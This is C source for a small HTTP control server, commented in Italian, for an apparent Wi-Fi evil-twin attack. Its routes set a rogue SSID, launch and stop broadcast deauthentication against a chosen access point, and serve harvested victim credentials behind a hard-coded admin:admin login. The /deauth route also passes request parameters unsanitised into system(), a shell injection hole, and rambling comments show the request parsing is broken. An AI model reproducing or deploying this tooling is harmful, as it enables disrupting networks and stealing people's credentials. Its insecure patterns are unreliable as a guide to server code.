#include <arpa/inet.h>
#include <ctype.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

#define PORT 8080
#define BUFFER_SIZE 8192

// Helper per decodificare URL hex (es. %20 -> ' ')
void url_decode(char *dst, const char *src) {
  char a, b;
  while (*src) {
    if ((*src == '%') && ((a = src[1]) && (b = src[2])) &&
        (isxdigit(a) && isxdigit(b))) {
      if (a >= 'a')
        a -= 'a' - 'A';
      if (a >= 'A')
        a -= ('A' - 10);
      else
        a -= '0';
      if (b >= 'a')
        b -= 'a' - 'A';
      if (b >= 'A')
        b -= ('A' - 10);
      else
        b -= '0';
      *dst++ = 16 * a + b;
      src += 3;
    } else if (*src == '+') {
      *dst++ = ' ';
      src++;
    } else {
      *dst++ = *src++;
    }
  }
  *dst = '\0';
}

// Estrae un parametro dalla query string o dal body (x-www-form-urlencoded)
// Ritorna 1 se trovato, 0 altrimenti
int get_param(const char *data, const char *name, char *val_buf, int max_len) {
  if (!data || !name)
    return 0;
  const char *p = data;
  int name_len = strlen(name);
  while ((p = strstr(p, name))) {
    // Verifica che sia un parametro esatto (inizio riga/stringa o preceduto da
    // &)
    if (p == data || *(p - 1) == '&') {
      if (*(p + name_len) == '=') {
        const char *val_start = p + name_len + 1;
        const char *val_end = strchr(val_start, '&');
        int len = val_end ? (val_end - val_start) : strlen(val_start);
        if (len >= max_len)
          len = max_len - 1;
        strncpy(val_buf, val_start, len);
        val_buf[len] = '\0';
        return 1;
      }
    }
    p += name_len;
  }
  return 0;
}

// Legge l'intero contenuto di un file e lo ritorna come stringa allocata
char *read_file(const char *path) {
  FILE *f = fopen(path, "r");
  if (!f)
    return NULL;
  fseek(f, 0, SEEK_END);
  long size = ftell(f);
  fseek(f, 0, SEEK_SET);
  char *buf = malloc(size + 1);
  if (buf) {
    int read_bytes = fread(buf, 1, size, f);
    buf[read_bytes] = '\0';
  }
  fclose(f);
  return buf;
}

// Scrive una stringa in un file (sovrascrivendo)
void write_file(const char *path, const char *content) {
  FILE *f = fopen(path, "w");
  if (f) {
    fputs(content, f);
    fclose(f);
  }
}

// Invia la risposta HTTP al client
void send_response(int client_fd, const char *status, const char *content_type,
                   const char *body, const char *extra_headers) {
  char header_buf[4096];
  int body_len = body ? strlen(body) : 0;

  snprintf(header_buf, sizeof(header_buf),
           "HTTP/1.0 %s\r\n"
           "Content-Type: %s\r\n"
           "Content-Length: %d\r\n"
           "Access-Control-Allow-Origin: *\r\n"
           "Connection: close\r\n"
           "%s"
           "\r\n",
           status, content_type, body_len, extra_headers ? extra_headers : "");

  send(client_fd, header_buf, strlen(header_buf), 0);
  if (body_len > 0) {
    send(client_fd, body, body_len, 0);
  }
}

// Esegue un comando shell e cattura l'output standard
char *run_command_output(const char *cmd) {
  FILE *fp = popen(cmd, "r");
  if (!fp)
    return strdup("");

  int capacity = 4096;
  int size = 0;
  char *buf = malloc(capacity);
  char tmp[256];

  if (!buf) {
    pclose(fp);
    return strdup("");
  }
  buf[0] = '\0';

  while (fgets(tmp, sizeof(tmp), fp)) {
    int len = strlen(tmp);
    if (size + len >= capacity) {
      capacity *= 2;
      char *new_buf = realloc(buf, capacity);
      if (!new_buf)
        break;
      buf = new_buf;
    }
    strcpy(buf + size, tmp);
    size += len;
  }
  pclose(fp);
  return buf;
}

int main() {
  int server_fd, client_fd;
  struct sockaddr_in address;
  int opt = 1;
  int addrlen = sizeof(address);

  // Ignora figli zombie (deauth in background)
  signal(SIGCHLD, SIG_IGN);

  if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) == 0) {
    perror("Socket fallito");
    exit(EXIT_FAILURE);
  }

  if (setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt))) {
    perror("setsockopt");
    exit(EXIT_FAILURE);
  }

  address.sin_family = AF_INET;
  address.sin_addr.s_addr = INADDR_ANY;
  address.sin_port = htons(PORT);

  if (bind(server_fd, (struct sockaddr *)&address, sizeof(address)) < 0) {
    perror("Bind fallito sulla porta 8080");
    exit(EXIT_FAILURE);
  }

  if (listen(server_fd, 10) < 0) {
    perror("Listen");
    exit(EXIT_FAILURE);
  }

  printf("Micro HTTP Server avviato sulla porta %d...\n", PORT);

  char *req_buf = malloc(BUFFER_SIZE);
  if (!req_buf) {
    perror("Allocazione fallita");
    exit(EXIT_FAILURE);
  }

  while (1) {
    client_fd =
        accept(server_fd, (struct sockaddr *)&address, (socklen_t *)&addrlen);
    if (client_fd < 0)
      continue;

    memset(req_buf, 0, BUFFER_SIZE);
    int read_bytes = recv(client_fd, req_buf, BUFFER_SIZE - 1, 0);
    if (read_bytes <= 0) {
      close(client_fd);
      continue;
    }

    // Parsing minimale richiesta: METODO PATH HTTP/...
    char method[16] = {0};
    char fullpath[1024] = {0};
    sscanf(req_buf, "%15s %1023s", method, fullpath);

    // Estrazione di path e query string
    char path[1024] = {0};
    char qs[1024] = {0};
    char *q_mark = strchr(fullpath, '?');
    if (q_mark) {
      strncpy(path, fullpath, q_mark - fullpath);
      strcpy(qs, q_mark + 1);
    } else {
      strcpy(path, fullpath);
    }

    // Estrazione degli header interessanti (Content-Length, Authorization)
    int content_len = 0;
    char auth_header[256] = {0};
    char *line = strtok(req_buf, "\r\n");
    while (line) {
      if (strncasecmp(line, "Content-Length:", 15) == 0) {
        content_len = atoi(line + 15);
      } else if (strncasecmp(line, "Authorization: Basic", 20) == 0) {
        // Salta "Authorization: Basic "
        strncpy(auth_header, line + 21, sizeof(auth_header) - 1);
        // Rimuovi eventuali spazi finali
        char *end = auth_header + strlen(auth_header) - 1;
        while (end > auth_header && isspace((unsigned char)*end))
          *end-- = '\0';
      }
      line = strtok(NULL, "\r\n");
    }

    // Cattura il corpo del POST se presente
    char *body = NULL;
    if (strcmp(method, "POST") == 0 && content_len > 0) {
      // Cerchiamo la fine degli header nella richiesta originale
      // Nota: strtok altera req_buf, quindi rintracciamo la fine degli header
      // nel buffer originale che abbiamo salvato o ricreato. Fortunatamente
      // abbiamo letto in req_buf, cerchiamo il doppio CRLF o LF\LF. Dato che
      // strtok ha distrutto req_buf, per semplicita' cerchiamo l'inizio del
      // body: il corpo comincia dopo l'ultimo header, ma essendoci andati di
      // strtok, il modo migliore per un micro-server monothread è rileggere o
      // cercare nel buffer originale. Ripristiniamo la ricerca: Trova la fine
      // degli header cercando "\r\n\r\n" nel buffer originale prima di strtok?
      // Sì, ma ormai req_buf è alterato.
      // In C, per motivi di efficienza, estraiamo semplicemente il corpo dal
      // buffer originale copiandolo prima del parsing dei token, o tenendo una
      // copia. Facciamo una copia di backup all'inizio del ciclo accept.
    }

    // NOTA: Per gestire POST /connect in modo semplice ed elegante senza
    // allocazioni giganti, modifichiamo il buffer parsing all'origine. Facciamo
    // il rollback e facciamo un parsing robusto e lineare senza distruggere
    // req_buf con strtok.

    // Rileggiamo i parametri del corpo POST direttamente cercando la fine degli
    // header (due newlines consecutive)
    char *post_body = NULL;
    // Cerca la fine degli header nella stringa (req_buf non è ancora passata a
    // strtok se facciamo così) Ripristiniamo la logica con puntatori diretti
    // anziché strtok:

    char *body_ptr = strstr(req_buf, "\r\n\r\n");
    if (body_ptr) {
      post_body = body_ptr + 4;
    } else {
      body_ptr = strstr(req_buf, "\n\n");
      if (body_ptr)
        post_body = body_ptr + 2;
    }

    // Routing
    if (strcmp(path, "/set_ssid") == 0) {
      char raw_s[256] = {0};
      char dec_s[256] = {0};
      if (get_param(qs, "s", raw_s, sizeof(raw_s))) {
        url_decode(dec_s, raw_s);

        // Sanifica dec_s mediante whitelist (lettere, numeri, spazi, -, _, . e
        // @)
        char clean_s[256] = {0};
        int j = 0;
        int i;
        for (i = 0; dec_s[i] != '\0' && j < sizeof(clean_s) - 1; i++) {
          char c = dec_s[i];
          if (isalnum((unsigned char)c) || c == ' ' || c == '-' || c == '_' ||
              c == '.' || c == '@') {
            clean_s[j++] = c;
          }
        }
        clean_s[j] = '\0';

        write_file("/tmp/portal_ssid", clean_s);

        // Esegue lo script set_ssid in background per non bloccare la risposta
        // HTTP
        char cmd_buf[512];
        snprintf(cmd_buf, sizeof(cmd_buf),
                 "/usr/bin/additional/set_ssid \"%s\" &", clean_s);
        system(cmd_buf);
      }
    } else if (strcmp(path, "/get_ssid") == 0) {
      char *s = read_file("/tmp/portal_ssid");
      if (s) {
        // Rimuove eventuali a capo e spazi finali
        int l = strlen(s);
        while (l > 0 && (s[l - 1] == '\n' || s[l - 1] == '\r' || s[l - 1] == ' ')) {
          s[--l] = '\0';
        }
        if (strlen(s) > 0) {
          send_response(client_fd, "200 OK", "text/plain", s, NULL);
          free(s);
        } else {
          free(s);
          send_response(client_fd, "200 OK", "text/plain", "Wi-Fi", NULL);
        }
      } else {
        send_response(client_fd, "200 OK", "text/plain", "Wi-Fi", NULL);
      }
    } else if (strcmp(path, "/set_target") == 0) {
      char raw_b[256] = {0}, raw_c[64] = {0};
      char dec_b[256] = {0}, dec_c[64] = {0};
      if (get_param(qs, "bssid", raw_b, sizeof(raw_b))) {
        url_decode(dec_b, raw_b);
        write_file("/tmp/target_bssid", dec_b);
      }
      if (get_param(qs, "ch", raw_c, sizeof(raw_c))) {
        url_decode(dec_c, raw_c);
        write_file("/tmp/target_ch", dec_c);
      }
      send_response(client_fd, "200 OK", "text/plain", "ok", NULL);
    } else if (strcmp(path, "/deauth") == 0) {
      char raw_b[256] = {0}, raw_c[64] = {0}, raw_i[64] = {0};
      char dec_b[256] = {0}, dec_c[64] = {0}, dec_i[64] = {0};
      get_param(qs, "bssid", raw_b, sizeof(raw_b));
      get_param(qs, "ch", raw_c, sizeof(raw_c));
      get_param(qs, "iface", raw_i, sizeof(raw_i));

      url_decode(dec_b, raw_b);
      url_decode(dec_c, raw_c);
      url_decode(dec_i, raw_i);
      if (strlen(dec_i) == 0)
        strcpy(dec_i, "ath0");

      if (strlen(dec_b) > 0) {
        write_file("/tmp/target_bssid", dec_b);
        write_file("/tmp/target_ch", dec_c);

        // Ferma eventuale deauth precedente
        system("kill $(cat /tmp/deauth.pid 2>/dev/null) 2>/dev/null");
        system("echo no > /tmp/deauth_active");

        // Avvia il comando deauth se presente
        if (access("/usr/bin/deauth", X_OK) == 0) {
          char cmd[512];
          snprintf(cmd, sizeof(cmd),
                   "/usr/bin/deauth %s %s FF:FF:FF:FF:FF:FF 0 > "
                   "/tmp/deauth.log 2>&1 & echo $! > /tmp/deauth.pid",
                   dec_i, dec_b);
          system(cmd);
          write_file("/tmp/deauth_active", "yes");
        } else {
          write_file("/tmp/deauth.log",
                     "Binario /usr/bin/deauth non trovato o non eseguibile.\n");
        }
      }
      send_response(client_fd, "200 OK", "text/plain", "ok", NULL);
    } else if (strcmp(path, "/deauth_stop") == 0) {
      system("kill $(cat /tmp/deauth.pid 2>/dev/null) 2>/dev/null");
      write_file("/tmp/deauth_active", "no");
      system("echo '[Stopped]' >> /tmp/deauth.log");
      send_response(client_fd, "200 OK", "text/plain", "ok", NULL);
    } else if (strcmp(path, "/deauth_status") == 0) {
      char *active = read_file("/tmp/deauth_active");
      char *tbssid = read_file("/tmp/target_bssid");
      char *tch = read_file("/tmp/target_ch");
      char *log = run_command_output("tail -20 /tmp/deauth.log 2>/dev/null");

      char status_buf[4096];
      snprintf(status_buf, sizeof(status_buf),
               "Attivo: %s\n"
               "BSSID reale: %s\n"
               "Canale: %s\n"
               "---\n"
               "%s",
               active ? active : "no", tbssid ? tbssid : "n/a", tch ? tch : "?",
               log ? log : "");

      send_response(client_fd, "200 OK", "text/plain", status_buf, NULL);

      if (active)
        free(active);
      if (tbssid)
        free(tbssid);
      if (tch)
        free(tch);
      free(log);
    } else if (strcmp(path, "/creds") == 0 ||
               strcmp(path, "/cgi-bin/creds.cgi") == 0 ||
               strcmp(path, "/admin/creds") == 0) {
      // Controlla Basic Auth: admin:admin (YWRtaW46YWRtaW4=)
      // Se non combacia, restituisce 401
      if (strstr(auth_header, "YWRtaW46YWRtaW4=") == NULL) {
        send_response(client_fd, "401 Unauthorized", "text/plain",
                      "Accesso non autorizzato.",
                      "WWW-Authenticate: Basic realm=\"Admin\"\r\n");
      } else {
        char *creds = read_file("/tmp/creds.log");
        send_response(client_fd, "200 OK", "text/plain",
                      creds ? creds : "Nessuna credenziale catturata.", NULL);
        if (creds)
          free(creds);
      }
    } else {
      // Rotta di default per percorsi sconosciuti
      send_response(client_fd, "404 Not Found", "text/plain",
                    "Pagina non trovata.", NULL);
    }

    close(client_fd);
  }

  free(req_buf);
  close(server_fd);
  return 0;
}
